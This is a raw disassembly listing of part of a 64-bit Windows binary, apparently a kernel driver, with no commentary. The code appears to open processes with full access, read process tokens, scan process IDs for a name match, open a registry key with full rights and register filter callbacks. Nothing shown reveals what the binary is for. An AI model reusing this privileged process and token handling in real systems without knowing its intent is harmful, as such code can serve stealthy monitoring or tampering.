   140004fcb:	4c 89 75 48          	mov    %r14,0x48(%rbp)
   140004fcf:	4c 89 75 50          	mov    %r14,0x50(%rbp)
   140004fd3:	44 89 75 40          	mov    %r14d,0x40(%rbp)
   140004fd7:	0f 11 45 f0          	movups %xmm0,-0x10(%rbp)
   140004fdb:	0f 85 29 01 00 00    	jne    0x14000510a
   140004fe1:	e8 8e 01 00 00       	call   0x140005174
   140004fe6:	48 8b f8             	mov    %rax,%rdi
   140004fe9:	48 85 c0             	test   %rax,%rax
   140004fec:	0f 84 28 01 00 00    	je     0x14000511a
   140004ff2:	48 8d 45 48          	lea    0x48(%rbp),%rax
   140004ff6:	41 b9 ff ff 1f 00    	mov    $0x1fffff,%r9d
   140004ffc:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140005001:	45 33 c0             	xor    %r8d,%r8d
   140005004:	48 8b 05 a5 32 00 00 	mov    0x32a5(%rip),%rax        # 0x1400082b0
   14000500b:	33 d2                	xor    %edx,%edx
   14000500d:	44 88 74 24 28       	mov    %r14b,0x28(%rsp)
   140005012:	48 8b 08             	mov    (%rax),%rcx
   140005015:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000501a:	48 8b cf             	mov    %rdi,%rcx
   14000501d:	ff 15 6d 32 00 00    	call   *0x326d(%rip)        # 0x140008290
   140005023:	85 c0                	test   %eax,%eax
   140005025:	0f 88 b8 00 00 00    	js     0x1400050e3
   14000502b:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   14000502f:	4c 8d 4d 50          	lea    0x50(%rbp),%r9
   140005033:	ba 08 00 02 00       	mov    $0x20008,%edx
   140005038:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   14000503e:	ff 15 54 32 00 00    	call   *0x3254(%rip)        # 0x140008298
   140005044:	85 c0                	test   %eax,%eax
   140005046:	0f 88 97 00 00 00    	js     0x1400050e3
   14000504c:	be 00 10 00 00       	mov    $0x1000,%esi
   140005051:	41 bf 51 61 78 58    	mov    $0x58786151,%r15d
   140005057:	8b d6                	mov    %esi,%edx
   140005059:	45 8b c7             	mov    %r15d,%r8d
   14000505c:	b9 01 00 00 00       	mov    $0x1,%ecx
   140005061:	ff 15 a1 32 00 00    	call   *0x32a1(%rip)        # 0x140008308
   140005067:	48 8b d8             	mov    %rax,%rbx
   14000506a:	48 85 c0             	test   %rax,%rax
   14000506d:	74 74                	je     0x1400050e3
   14000506f:	48 8b c8             	mov    %rax,%rcx
   140005072:	ff 15 00 31 00 00    	call   *0x3100(%rip)        # 0x140008178
   140005078:	84 c0                	test   %al,%al
   14000507a:	74 67                	je     0x1400050e3
   14000507c:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140005080:	48 8d 45 40          	lea    0x40(%rbp),%rax
   140005084:	44 8b ce             	mov    %esi,%r9d
   140005087:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000508c:	4c 8b c3             	mov    %rbx,%r8
   14000508f:	ba 01 00 00 00       	mov    $0x1,%edx
   140005094:	ff 15 be 31 00 00    	call   *0x31be(%rip)        # 0x140008258
   14000509a:	3d 23 00 00 c0       	cmp    $0xc0000023,%eax
   14000509f:	75 15                	jne    0x1400050b6
   1400050a1:	41 8b d7             	mov    %r15d,%edx
   1400050a4:	48 8b cb             	mov    %rbx,%rcx
   1400050a7:	ff 15 93 32 00 00    	call   *0x3293(%rip)        # 0x140008340
   1400050ad:	8d 04 36             	lea    (%rsi,%rsi,1),%eax
   1400050b0:	8b f0                	mov    %eax,%esi
   1400050b2:	8b d0                	mov    %eax,%edx
   1400050b4:	eb a3                	jmp    0x140005059
   1400050b6:	85 c0                	test   %eax,%eax
   1400050b8:	78 1d                	js     0x1400050d7
   1400050ba:	b8 00 02 00 00       	mov    $0x200,%eax
   1400050bf:	4c 89 65 f8          	mov    %r12,-0x8(%rbp)
   1400050c3:	66 89 45 f2          	mov    %ax,-0xe(%rbp)
   1400050c7:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400050cb:	48 8b 13             	mov    (%rbx),%rdx
   1400050ce:	45 33 c0             	xor    %r8d,%r8d
   1400050d1:	ff 15 91 31 00 00    	call   *0x3191(%rip)        # 0x140008268
   1400050d7:	41 8b d7             	mov    %r15d,%edx
   1400050da:	48 8b cb             	mov    %rbx,%rcx
   1400050dd:	ff 15 5d 32 00 00    	call   *0x325d(%rip)        # 0x140008340
   1400050e3:	48 8b cf             	mov    %rdi,%rcx
   1400050e6:	ff 15 14 30 00 00    	call   *0x3014(%rip)        # 0x140008100
   1400050ec:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   1400050f0:	48 85 c9             	test   %rcx,%rcx
   1400050f3:	74 06                	je     0x1400050fb
   1400050f5:	ff 15 2d 30 00 00    	call   *0x302d(%rip)        # 0x140008128
   1400050fb:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   1400050ff:	48 85 c9             	test   %rcx,%rcx
   140005102:	74 06                	je     0x14000510a
   140005104:	ff 15 1e 30 00 00    	call   *0x301e(%rip)        # 0x140008128
   14000510a:	0f b7 05 0f a9 00 00 	movzwl 0xa90f(%rip),%eax        # 0x14000fa20
   140005111:	66 f7 d8             	neg    %ax
   140005114:	48 1b c0             	sbb    %rax,%rax
   140005117:	49 23 c4             	and    %r12,%rax
   14000511a:	48 83 c4 50          	add    $0x50,%rsp
   14000511e:	41 5f                	pop    %r15
   140005120:	41 5e                	pop    %r14
   140005122:	41 5c                	pop    %r12
   140005124:	5f                   	pop    %rdi
   140005125:	5e                   	pop    %rsi
   140005126:	5b                   	pop    %rbx
   140005127:	5d                   	pop    %rbp
   140005128:	c3                   	ret
   140005129:	cc                   	int3
   14000512a:	cc                   	int3
   14000512b:	cc                   	int3
   14000512c:	40 53                	rex push %rbx
   14000512e:	48 83 ec 20          	sub    $0x20,%rsp
   140005132:	33 db                	xor    %ebx,%ebx
   140005134:	48 85 c9             	test   %rcx,%rcx
   140005137:	75 04                	jne    0x14000513d
   140005139:	33 c0                	xor    %eax,%eax
   14000513b:	eb 30                	jmp    0x14000516d
   14000513d:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005142:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   140005147:	ff 15 3b 31 00 00    	call   *0x313b(%rip)        # 0x140008288
   14000514d:	85 c0                	test   %eax,%eax
   14000514f:	78 19                	js     0x14000516a
   140005151:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005156:	ff 15 4c 31 00 00    	call   *0x314c(%rip)        # 0x1400082a8
   14000515c:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   140005161:	48 8b d8             	mov    %rax,%rbx
   140005164:	ff 15 96 2f 00 00    	call   *0x2f96(%rip)        # 0x140008100
   14000516a:	48 8b c3             	mov    %rbx,%rax
   14000516d:	48 83 c4 20          	add    $0x20,%rsp
   140005171:	5b                   	pop    %rbx
   140005172:	c3                   	ret
   140005173:	cc                   	int3
   140005174:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005179:	57                   	push   %rdi
   14000517a:	48 81 ec 40 01 00 00 	sub    $0x140,%rsp
   140005181:	48 8b 05 28 66 00 00 	mov    0x6628(%rip),%rax        # 0x14000b7b0
   140005188:	48 33 c4             	xor    %rsp,%rax
   14000518b:	48 89 84 24 30 01 00 	mov    %rax,0x130(%rsp)
   140005192:	00 
   140005193:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140005199:	bb 04 00 00 00       	mov    $0x4,%ebx
   14000519e:	33 d2                	xor    %edx,%edx
   1400051a0:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400051a5:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1400051ab:	e8 d0 22 00 00       	call   0x140007480
   1400051b0:	8b cb                	mov    %ebx,%ecx
   1400051b2:	8b fb                	mov    %ebx,%edi
   1400051b4:	e8 73 ff ff ff       	call   0x14000512c
   1400051b9:	48 85 c0             	test   %rax,%rax
   1400051bc:	74 17                	je     0x1400051d5
   1400051be:	41 b8 ff 00 00 00    	mov    $0xff,%r8d
   1400051c4:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400051c9:	48 8b d0             	mov    %rax,%rdx
   1400051cc:	e8 2b fa ff ff       	call   0x140004bfc
   1400051d1:	84 c0                	test   %al,%al
   1400051d3:	74 2e                	je     0x140005203
   1400051d5:	b9 06 00 00 00       	mov    $0x6,%ecx
   1400051da:	e8 05 c9 ff ff       	call   0x140001ae4
   1400051df:	48 8b d0             	mov    %rax,%rdx
   1400051e2:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400051e7:	e8 74 1e 00 00       	call   0x140007060
   1400051ec:	48 85 c0             	test   %rax,%rax
   1400051ef:	74 12                	je     0x140005203
   1400051f1:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400051f6:	48 8b cf             	mov    %rdi,%rcx
   1400051f9:	ff 15 89 30 00 00    	call   *0x3089(%rip)        # 0x140008288
   1400051ff:	85 c0                	test   %eax,%eax
   140005201:	79 2e                	jns    0x140005231
   140005203:	83 c3 04             	add    $0x4,%ebx
   140005206:	81 fb 00 00 01 00    	cmp    $0x10000,%ebx
   14000520c:	72 90                	jb     0x14000519e
   14000520e:	33 c0                	xor    %eax,%eax
   140005210:	48 8b 8c 24 30 01 00 	mov    0x130(%rsp),%rcx
   140005217:	00 
   140005218:	48 33 cc             	xor    %rsp,%rcx
   14000521b:	e8 90 1e 00 00       	call   0x1400070b0
   140005220:	48 8b 9c 24 50 01 00 	mov    0x150(%rsp),%rbx
   140005227:	00 
   140005228:	48 81 c4 40 01 00 00 	add    $0x140,%rsp
   14000522f:	5f                   	pop    %rdi
   140005230:	c3                   	ret
   140005231:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140005236:	eb d8                	jmp    0x140005210
   140005238:	40 53                	rex push %rbx
   14000523a:	48 83 ec 60          	sub    $0x60,%rsp
   14000523e:	48 8b da             	mov    %rdx,%rbx
   140005241:	48 8b d1             	mov    %rcx,%rdx
   140005244:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140005249:	ff 15 f9 30 00 00    	call   *0x30f9(%rip)        # 0x140008348
   14000524f:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140005255:	48 8d 44 24 20       	lea    0x20(%rsp),%rax
   14000525a:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000525d:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140005262:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005267:	c7 44 24 30 30 00 00 	movl   $0x30,0x30(%rsp)
   14000526e:	00 
   14000526f:	ba 3f 00 0f 00       	mov    $0xf003f,%edx
   140005274:	c7 44 24 48 40 02 00 	movl   $0x240,0x48(%rsp)
   14000527b:	00 
   14000527c:	48 8b cb             	mov    %rbx,%rcx
   14000527f:	f3 0f 7f 44 24 50    	movdqu %xmm0,0x50(%rsp)
   140005285:	ff 15 ad 2f 00 00    	call   *0x2fad(%rip)        # 0x140008238
   14000528b:	48 83 c4 60          	add    $0x60,%rsp
   14000528f:	5b                   	pop    %rbx
   140005290:	c3                   	ret
   140005291:	cc                   	int3
   140005292:	cc                   	int3
   140005293:	cc                   	int3
   140005294:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005299:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000529e:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   1400052a3:	55                   	push   %rbp
   1400052a4:	48 8b ec             	mov    %rsp,%rbp
   1400052a7:	48 83 ec 50          	sub    $0x50,%rsp
   1400052ab:	48 8b d9             	mov    %rcx,%rbx
   1400052ae:	33 ff                	xor    %edi,%edi
   1400052b0:	48 8d 4d e8          	lea    -0x18(%rbp),%rcx
   1400052b4:	89 7d 28             	mov    %edi,0x28(%rbp)
   1400052b7:	48 89 7d e0          	mov    %rdi,-0x20(%rbp)
   1400052bb:	49 8b f0             	mov    %r8,%rsi
   1400052be:	ff 15 84 30 00 00    	call   *0x3084(%rip)        # 0x140008348
   1400052c4:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
   1400052c8:	48 8b cb             	mov    %rbx,%rcx
   1400052cb:	e8 68 ff ff ff       	call   0x140005238
   1400052d0:	85 c0                	test   %eax,%eax
   1400052d2:	0f 88 94 00 00 00    	js     0x14000536c
   1400052d8:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   1400052dc:	48 8d 45 28          	lea    0x28(%rbp),%rax
   1400052e0:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400052e5:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   1400052e9:	45 33 c9             	xor    %r9d,%r9d
   1400052ec:	89 7c 24 20          	mov    %edi,0x20(%rsp)
   1400052f0:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   1400052f4:	ff 15 4e 2f 00 00    	call   *0x2f4e(%rip)        # 0x140008248
   1400052fa:	3d 34 00 00 c0       	cmp    $0xc0000034,%eax
   1400052ff:	74 5a                	je     0x14000535b
   140005301:	39 7d 28             	cmp    %edi,0x28(%rbp)
   140005304:	74 55                	je     0x14000535b
   140005306:	8b 55 28             	mov    0x28(%rbp),%edx
   140005309:	8d 4f 01             	lea    0x1(%rdi),%ecx
   14000530c:	41 b8 51 61 78 58    	mov    $0x58786151,%r8d
   140005312:	ff 15 f0 2f 00 00    	call   *0x2ff0(%rip)        # 0x140008308
   140005318:	48 8b d8             	mov    %rax,%rbx
   14000531b:	48 85 c0             	test   %rax,%rax
   14000531e:	74 3b                	je     0x14000535b
   140005320:	48 8b c8             	mov    %rax,%rcx
   140005323:	ff 15 4f 2e 00 00    	call   *0x2e4f(%rip)        # 0x140008178
   140005329:	84 c0                	test   %al,%al
   14000532b:	74 2e                	je     0x14000535b
   14000532d:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140005331:	48 8d 45 28          	lea    0x28(%rbp),%rax
   140005335:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   14000533a:	44 8d 47 02          	lea    0x2(%rdi),%r8d
   14000533e:	8b 45 28             	mov    0x28(%rbp),%eax
   140005341:	48 8d 55 e8          	lea    -0x18(%rbp),%rdx
   140005345:	4c 8b cb             	mov    %rbx,%r9
   140005348:	89 44 24 20          	mov    %eax,0x20(%rsp)
   14000534c:	ff 15 f6 2e 00 00    	call   *0x2ef6(%rip)        # 0x140008248
   140005352:	85 c0                	test   %eax,%eax
   140005354:	78 05                	js     0x14000535b
   140005356:	48 89 1e             	mov    %rbx,(%rsi)
   140005359:	eb 05                	jmp    0x140005360
   14000535b:	bf 01 00 00 c0       	mov    $0xc0000001,%edi
   140005360:	48 8b 4d e0          	mov    -0x20(%rbp),%rcx
   140005364:	ff 15 be 2d 00 00    	call   *0x2dbe(%rip)        # 0x140008128
   14000536a:	8b c7                	mov    %edi,%eax
   14000536c:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   140005371:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005376:	48 8b 7c 24 70       	mov    0x70(%rsp),%rdi
   14000537b:	48 83 c4 50          	add    $0x50,%rsp
   14000537f:	5d                   	pop    %rbp
   140005380:	c3                   	ret
   140005381:	cc                   	int3
   140005382:	cc                   	int3
   140005383:	cc                   	int3
   140005384:	45 33 c0             	xor    %r8d,%r8d
   140005387:	33 d2                	xor    %edx,%edx
   140005389:	48 ff 25 88 2f 00 00 	rex.W jmp *0x2f88(%rip)        # 0x140008318
   140005390:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005395:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   14000539a:	57                   	push   %rdi
   14000539b:	48 83 ec 50          	sub    $0x50,%rsp
   14000539f:	48 8b d9             	mov    %rcx,%rbx
   1400053a2:	49 8b f9             	mov    %r9,%rdi
   1400053a5:	48 8d 4c 24 38       	lea    0x38(%rsp),%rcx
   1400053aa:	41 8b f0             	mov    %r8d,%esi
   1400053ad:	ff 15 95 2f 00 00    	call   *0x2f95(%rip)        # 0x140008348
   1400053b3:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   1400053b8:	48 8b cb             	mov    %rbx,%rcx
   1400053bb:	e8 c4 fa ff ff       	call   0x140004e84
   1400053c0:	85 c0                	test   %eax,%eax
   1400053c2:	78 42                	js     0x140005406
   1400053c4:	8b 84 24 80 00 00 00 	mov    0x80(%rsp),%eax
   1400053cb:	48 8d 54 24 38       	lea    0x38(%rsp),%rdx
   1400053d0:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400053d5:	44 8b ce             	mov    %esi,%r9d
   1400053d8:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1400053dc:	45 33 c0             	xor    %r8d,%r8d
   1400053df:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   1400053e4:	ff 15 66 2e 00 00    	call   *0x2e66(%rip)        # 0x140008250
   1400053ea:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400053ef:	8b d8                	mov    %eax,%ebx
   1400053f1:	ff 15 49 2e 00 00    	call   *0x2e49(%rip)        # 0x140008240
   1400053f7:	48 8b 4c 24 30       	mov    0x30(%rsp),%rcx
   1400053fc:	ff 15 26 2d 00 00    	call   *0x2d26(%rip)        # 0x140008128
   140005402:	8b c3                	mov    %ebx,%eax
   140005404:	eb 03                	jmp    0x140005409
   140005406:	83 c8 ff             	or     $0xffffffff,%eax
   140005409:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   14000540e:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   140005413:	48 83 c4 50          	add    $0x50,%rsp
   140005417:	5f                   	pop    %rdi
   140005418:	c3                   	ret
   140005419:	cc                   	int3
   14000541a:	cc                   	int3
   14000541b:	cc                   	int3
   14000541c:	48 8b c4             	mov    %rsp,%rax
   14000541f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140005423:	48 89 68 10          	mov    %rbp,0x10(%rax)
   140005427:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000542b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   14000542f:	45 33 c9             	xor    %r9d,%r9d
   140005432:	49 63 d8             	movslq %r8d,%rbx
   140005435:	4c 8b d2             	mov    %rdx,%r10
   140005438:	48 85 c9             	test   %rcx,%rcx
   14000543b:	74 64                	je     0x1400054a1
   14000543d:	48 85 d2             	test   %rdx,%rdx
   140005440:	74 5f                	je     0x1400054a1
   140005442:	45 85 c0             	test   %r8d,%r8d
   140005445:	7e 5a                	jle    0x1400054a1
   140005447:	44 38 09             	cmp    %r9b,(%rcx)
   14000544a:	74 55                	je     0x1400054a1
   14000544c:	48 8b d1             	mov    %rcx,%rdx
   14000544f:	48 8b c2             	mov    %rdx,%rax
   140005452:	48 2b c1             	sub    %rcx,%rax
   140005455:	48 3b c3             	cmp    %rbx,%rax
   140005458:	7d 47                	jge    0x1400054a1
   14000545a:	41 8a 02             	mov    (%r10),%al
   14000545d:	38 02                	cmp    %al,(%rdx)
   14000545f:	75 35                	jne    0x140005496
   140005461:	45 33 db             	xor    %r11d,%r11d
   140005464:	84 c0                	test   %al,%al
   140005466:	74 27                	je     0x14000548f
   140005468:	48 8b f2             	mov    %rdx,%rsi
   14000546b:	4d 8b c2             	mov    %r10,%r8
   14000546e:	49 2b f2             	sub    %r10,%rsi
   140005471:	41 8b f9             	mov    %r9d,%edi
   140005474:	3b fb                	cmp    %ebx,%edi
   140005476:	7d 17                	jge    0x14000548f
   140005478:	42 8a 04 06          	mov    (%rsi,%r8,1),%al
   14000547c:	41 38 00             	cmp    %al,(%r8)
   14000547f:	75 0e                	jne    0x14000548f
   140005481:	49 ff c0             	inc    %r8
   140005484:	ff c7                	inc    %edi
   140005486:	49 ff c3             	inc    %r11
   140005489:	41 80 38 00          	cmpb   $0x0,(%r8)
   14000548d:	75 e5                	jne    0x140005474
   14000548f:	43 80 3c 13 00       	cmpb   $0x0,(%r11,%r10,1)
   140005494:	74 22                	je     0x1400054b8
   140005496:	48 ff c2             	inc    %rdx
   140005499:	41 ff c1             	inc    %r9d
   14000549c:	80 3a 00             	cmpb   $0x0,(%rdx)
   14000549f:	75 ae                	jne    0x14000544f
   1400054a1:	33 c0                	xor    %eax,%eax
   1400054a3:	48 8b 5c 24 08       	mov    0x8(%rsp),%rbx
   1400054a8:	48 8b 6c 24 10       	mov    0x10(%rsp),%rbp
   1400054ad:	48 8b 74 24 18       	mov    0x18(%rsp),%rsi
   1400054b2:	48 8b 7c 24 20       	mov    0x20(%rsp),%rdi
   1400054b7:	c3                   	ret
   1400054b8:	49 63 c1             	movslq %r9d,%rax
   1400054bb:	48 03 c1             	add    %rcx,%rax
   1400054be:	eb e3                	jmp    0x1400054a3
   1400054c0:	48 83 ec 38          	sub    $0x38,%rsp
   1400054c4:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   1400054ca:	45 33 c9             	xor    %r9d,%r9d
   1400054cd:	45 33 c0             	xor    %r8d,%r8d
   1400054d0:	33 d2                	xor    %edx,%edx
   1400054d2:	ff 15 38 2e 00 00    	call   *0x2e38(%rip)        # 0x140008310
   1400054d8:	48 83 c4 38          	add    $0x38,%rsp
   1400054dc:	c3                   	ret
   1400054dd:	cc                   	int3
   1400054de:	cc                   	int3
   1400054df:	cc                   	int3
   1400054e0:	48 83 ec 68          	sub    $0x68,%rsp
   1400054e4:	48 8b 05 c5 62 00 00 	mov    0x62c5(%rip),%rax        # 0x14000b7b0
   1400054eb:	48 33 c4             	xor    %rsp,%rax
   1400054ee:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1400054f3:	48 83 3d 2d a7 00 00 	cmpq   $0x0,0xa72d(%rip)        # 0x14000fc28
   1400054fa:	00 
   1400054fb:	75 07                	jne    0x140005504
   1400054fd:	b8 08 00 00 c0       	mov    $0xc0000008,%eax
   140005502:	eb 56                	jmp    0x14000555a
   140005504:	33 c0                	xor    %eax,%eax
   140005506:	4c 8d 05 23 a7 00 00 	lea    0xa723(%rip),%r8        # 0x14000fc30
   14000550d:	48 89 44 24 44       	mov    %rax,0x44(%rsp)
   140005512:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   140005517:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000551a:	48 8d 05 af 03 00 00 	lea    0x3af(%rip),%rax        # 0x1400058d0
   140005521:	0f 11 44 24 34       	movups %xmm0,0x34(%rsp)
   140005526:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   14000552b:	48 8d 05 ee 04 00 00 	lea    0x4ee(%rip),%rax        # 0x140005a20
   140005532:	0f 11 44 24 24       	movups %xmm0,0x24(%rsp)
   140005537:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000553c:	48 8d 05 fd c2 ff ff 	lea    -0x3d03(%rip),%rax        # 0x140001840
   140005543:	0f 10 05 de 2e 00 00 	movups 0x2ede(%rip),%xmm0        # 0x140008428
   14000554a:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   14000554f:	f3 0f 7f 44 24 20    	movdqu %xmm0,0x20(%rsp)
   140005555:	e8 c3 19 00 00       	call   0x140006f1d
   14000555a:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   14000555f:	48 33 cc             	xor    %rsp,%rcx
   140005562:	e8 49 1b 00 00       	call   0x1400070b0
   140005567:	48 83 c4 68          	add    $0x68,%rsp
   14000556b:	c3                   	ret
   14000556c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005571:	55                   	push   %rbp
   140005572:	48 8d ac 24 10 ff ff 	lea    -0xf0(%rsp),%rbp
   140005579:	ff 
   14000557a:	48 81 ec f0 01 00 00 	sub    $0x1f0,%rsp
   140005581:	48 8b 05 28 62 00 00 	mov    0x6228(%rip),%rax        # 0x14000b7b0
   140005588:	48 33 c4             	xor    %rsp,%rax
   14000558b:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   140005592:	33 d2                	xor    %edx,%edx
   140005594:	48 8d 4d 54          	lea    0x54(%rbp),%rcx
   140005598:	44 8d 42 54          	lea    0x54(%rdx),%r8d
   14000559c:	e8 df 1e 00 00       	call   0x140007480
   1400055a1:	8b 05 19 21 00 00    	mov    0x2119(%rip),%eax        # 0x1400076c0
   1400055a7:	48 8d 55 50          	lea    0x50(%rbp),%rdx
   1400055ab:	0f 10 05 76 2e 00 00 	movups 0x2e76(%rip),%xmm0        # 0x140008428
   1400055b2:	48 8b 0d 6f a6 00 00 	mov    0xa66f(%rip),%rcx        # 0x14000fc28
   1400055b9:	45 33 c9             	xor    %r9d,%r9d
   1400055bc:	83 65 70 00          	andl   $0x0,0x70(%rbp)
   1400055c0:	45 33 c0             	xor    %r8d,%r8d
   1400055c3:	89 85 b0 00 00 00    	mov    %eax,0xb0(%rbp)
   1400055c9:	0f b7 05 f4 20 00 00 	movzwl 0x20f4(%rip),%eax        # 0x1400076c4
   1400055d0:	66 89 85 b4 00 00 00 	mov    %ax,0xb4(%rbp)
   1400055d7:	8b 05 f3 20 00 00    	mov    0x20f3(%rip),%eax        # 0x1400076d0
   1400055dd:	89 85 b8 00 00 00    	mov    %eax,0xb8(%rbp)
   1400055e3:	0f b7 05 ea 20 00 00 	movzwl 0x20ea(%rip),%eax        # 0x1400076d4
   1400055ea:	66 89 85 bc 00 00 00 	mov    %ax,0xbc(%rbp)
   1400055f1:	48 8d 85 b0 00 00 00 	lea    0xb0(%rbp),%rax
   1400055f8:	f3 0f 7f 45 50       	movdqu %xmm0,0x50(%rbp)
   1400055fd:	48 89 45 60          	mov    %rax,0x60(%rbp)
   140005601:	48 8d 85 b8 00 00 00 	lea    0xb8(%rbp),%rax
   140005608:	0f 10 05 f1 2d 00 00 	movups 0x2df1(%rip),%xmm0        # 0x140008400
   14000560f:	48 89 45 68          	mov    %rax,0x68(%rbp)
   140005613:	f3 0f 7f 85 90 00 00 	movdqu %xmm0,0x90(%rbp)
   14000561a:	00 
   14000561b:	e8 33 19 00 00       	call   0x140006f53
   140005620:	8b d8                	mov    %eax,%ebx
   140005622:	85 c0                	test   %eax,%eax
   140005624:	74 13                	je     0x140005639
   140005626:	48 8b 0d fb a5 00 00 	mov    0xa5fb(%rip),%rcx        # 0x14000fc28
   14000562d:	e8 0f 19 00 00       	call   0x140006f41
   140005632:	8b c3                	mov    %ebx,%eax
   140005634:	e9 54 01 00 00       	jmp    0x14000578d
   140005639:	33 d2                	xor    %edx,%edx
   14000563b:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   140005640:	44 8d 42 44          	lea    0x44(%rdx),%r8d
   140005644:	e8 37 1e 00 00       	call   0x140007480
   140005649:	8b 05 91 20 00 00    	mov    0x2091(%rip),%eax        # 0x1400076e0
   14000564f:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   140005654:	0f 10 05 dd 2d 00 00 	movups 0x2ddd(%rip),%xmm0        # 0x140008438
   14000565b:	48 8b 0d c6 a5 00 00 	mov    0xa5c6(%rip),%rcx        # 0x14000fc28
   140005662:	45 33 c0             	xor    %r8d,%r8d
   140005665:	83 64 24 50 00       	andl   $0x0,0x50(%rsp)
   14000566a:	89 85 c0 00 00 00    	mov    %eax,0xc0(%rbp)
   140005670:	0f b7 05 6d 20 00 00 	movzwl 0x206d(%rip),%eax        # 0x1400076e4
   140005677:	66 89 85 c4 00 00 00 	mov    %ax,0xc4(%rbp)
   14000567e:	48 8d 85 c0 00 00 00 	lea    0xc0(%rbp),%rax
   140005685:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   14000568a:	48 b8 73 00 66 00 72 	movabs $0x7200660073,%rax
   140005691:	00 00 00 
   140005694:	48 89 85 e0 00 00 00 	mov    %rax,0xe0(%rbp)
   14000569b:	48 8d 85 e0 00 00 00 	lea    0xe0(%rbp),%rax
   1400056a2:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   1400056a7:	b8 ff ff 00 00       	mov    $0xffff,%eax
   1400056ac:	66 89 44 24 70       	mov    %ax,0x70(%rsp)
   1400056b1:	f3 0f 7f 44 24 30    	movdqu %xmm0,0x30(%rsp)
   1400056b7:	e8 8b 18 00 00       	call   0x140006f47
   1400056bc:	8b d8                	mov    %eax,%ebx
   1400056be:	85 c0                	test   %eax,%eax
   1400056c0:	0f 85 60 ff ff ff    	jne    0x140005626
   1400056c6:	48 83 4c 24 20 ff    	orq    $0xffffffffffffffff,0x20(%rsp)
   1400056cc:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1400056d0:	33 d2                	xor    %edx,%edx
   1400056d2:	41 b8 c8 00 00 00    	mov    $0xc8,%r8d
   1400056d8:	e8 a3 1d 00 00       	call   0x140007480
   1400056dd:	0f b7 05 14 20 00 00 	movzwl 0x2014(%rip),%eax        # 0x1400076f8
   1400056e4:	4c 8d 0d 4d a5 00 00 	lea    0xa54d(%rip),%r9        # 0x14000fc38
   1400056eb:	f2 0f 10 05 fd 1f 00 	movsd  0x1ffd(%rip),%xmm0        # 0x1400076f0
   1400056f2:	00 
   1400056f3:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1400056f7:	0f 10 0d 2a 2d 00 00 	movups 0x2d2a(%rip),%xmm1        # 0x140008428
   1400056fe:	48 8b 0d 23 a5 00 00 	mov    0xa523(%rip),%rcx        # 0x14000fc28
   140005705:	45 33 c0             	xor    %r8d,%r8d
   140005708:	21 5d f0             	and    %ebx,-0x10(%rbp)
   14000570b:	66 89 85 d8 00 00 00 	mov    %ax,0xd8(%rbp)
   140005712:	48 8d 85 d0 00 00 00 	lea    0xd0(%rbp),%rax
   140005719:	48 89 45 90          	mov    %rax,-0x70(%rbp)
